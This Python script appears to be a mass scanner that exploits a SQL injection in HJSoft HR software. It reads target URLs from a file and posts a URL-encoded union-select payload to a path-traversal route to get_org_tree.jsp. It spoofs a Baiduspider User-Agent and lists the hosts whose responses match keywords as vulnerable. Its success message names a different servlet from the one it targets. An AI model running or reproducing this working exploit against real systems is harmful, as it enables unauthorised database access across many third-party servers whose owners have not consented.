import http.client
from colorama import Fore, Style, init
import urllib3

# 初始化 colorama
init(autoreset=True, convert=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_urls_from_file(filename):
    urls = []
    with open(filename, 'r') as file:
        for line in file:
            urls.append(line.strip())
    return urls

def send_request(url, vulnerable_urls):
    try:
        # 解析 URL
        url_parts = url.split("/")
        host = url_parts[2]
        path = "/templates/attestation/../../kq/app_check_in/get_org_tree.jsp"
        # 构造 payload
        payload = "params=%31%3d%30%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%75%73%65%72%5f%6e%61%6d%65%28%29%2c%27%68%6a%73%6f%66%74%27%2c%34%2d%2d%2b"
        # 发送 POST 请求
        conn = http.client.HTTPConnection(host)
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)",
            "Accept": "*/*",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Host": host,
            "Content-type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(payload))
        }
        conn.request("POST", path, payload, headers)
        # 获取响应
        response = conn.getresponse()
        # 读取响应内容
        response_content = response.read().decode("utf-8")
        # 关闭连接
        conn.close()
        return response_content
    except http.client.RemoteDisconnected as e:
        print(Fore.GREEN + f"[-] {url}: 远程主机强迫关闭了一个现有的连接" + Style.RESET_ALL)
        return None
    except http.client.HTTPException as e:
        print(Fore.GREEN + f"[-] {url}: 由于目标计算机积极拒绝，无法连接" + Style.RESET_ALL)
        return None
    except TimeoutError as e:
        print(Fore.GREEN + f"[-] URL {url}: 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败" + Style.RESET_ALL)
        return None
    except Exception as e:
        raise e

def check_response(response, url):
    keywords = ["root", "organization", "hjsoft",  "code"]
    for keyword in keywords:
        if keyword in response:
            return True
    return False

if __name__ == "__main__":
    vulnerable_urls = []
    urls = read_urls_from_file('url.txt')
    for url in urls:
        try:
            response = send_request(url, vulnerable_urls)
            if response is None:
                continue
            if check_response(response, url):
                print(Fore.RED + f"[+] {url} 报告发现FrCodeAddTreeServlet注入" + Style.RESET_ALL)
                vulnerable_urls.append(url)
            else:
                print(Fore.GREEN + f"[-] 貌似不存在，换个姿势尝试 {url} " + Style.RESET_ALL)
        except Exception as e:
            print(f"[-] {url}: {e}")

    # 输出存在漏洞的 URL 统计
    print(Fore.GREEN + "\n存在漏洞的URL:" + Style.RESET_ALL)
    for vulnerable_url in vulnerable_urls:
        print(vulnerable_url)
